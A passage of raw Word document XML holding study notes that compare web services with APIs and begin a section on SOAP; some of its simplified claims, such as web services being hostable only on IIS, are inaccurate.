          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:tooltip="WOULD VS SHOULD" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="83A7BA"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>would</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>perform.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3. A Web service uses only three styles of use: SOAP, REST and XML-RPC for</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>communication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> whereas API may use any style for communication.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4. A Web service always needs a network for its operation whereas an API doesn’t need</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> network for its operation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00355281" w:rsidRPr="00584E67" w:rsidRDefault="00355281" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>5. An API facilitates interfacing directly with an application whereas a Web service is a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="263" w:after="176" w:line="527" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4466C5"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4466C5"/>
        </w:rPr>
        <w:t>Web Service</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:after="0" w:line="421" w:lineRule="atLeast"/>
        <w:ind w:left="35"/>
        <w:jc w:val="both"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
        <w:t>It is based on SOAP and return data in XML form.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:after="0" w:line="421" w:lineRule="atLeast"/>
        <w:ind w:left="35"/>
        <w:jc w:val="both"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
        <w:t xml:space="preserve">It </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
        <w:t>support</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
        <w:t xml:space="preserve"> only HTTP protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:after="0" w:line="421" w:lineRule="atLeast"/>
        <w:ind w:left="35"/>
        <w:jc w:val="both"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
        <w:t>It is not open source but can be consumed by any client that understands xml.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:after="0" w:line="421" w:lineRule="atLeast"/>
        <w:ind w:left="35"/>
        <w:jc w:val="both"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="161616"/>
        </w:rPr>
        <w:t>It can be hosted only on IIS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00355281">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="263" w:beforeAutospacing="0" w:after="263" w:afterAutospacing="0" w:line="562" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>API (Application Programming Interface) is nothing but the protocol intended to be used as an</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>interface</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>by</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>software components</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">to communicate with each other. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>An API acts as an interface between two different applications so that they can communicate with each other.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Web Service is an API used in the context of</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>web development. A</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Web service</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>is a method of communication between two electronic devices over the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>World Wide Web.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>API use any means of communication to initiate interaction between applications. API has a complete set of rules and specifications for a software program to interaction with each other.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>A Web service may not have a complete set of specifications and sometimes might not be able to perform all the tasks.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>API can be stripped in a various ways: COM Object, DLL files, Header files with .h extension, RMI in java etc, linux kernel API.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Web Services must be exposed the API is strictly through a network. Web Service API almost always </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>uses HTTP or SMTP. Web Services can be SOAP, XML-RPC, REST, etc. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00671086" w:rsidRPr="00584E67" w:rsidRDefault="00671086" w:rsidP="00671086">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="325" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Web API i.e. Web Service is typically defined as a set of Hypertext Transfer Protocol (HTTP) request messages, along with a definition of the structure of response messages, which is usually in </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>an Extensible Markup Language (XML) or JavaScript Object Notation (JSON) format.</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shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>All Web services are APIs but all APIs are not Web services.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="666666"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SOAP:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SOAP is based on XML.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
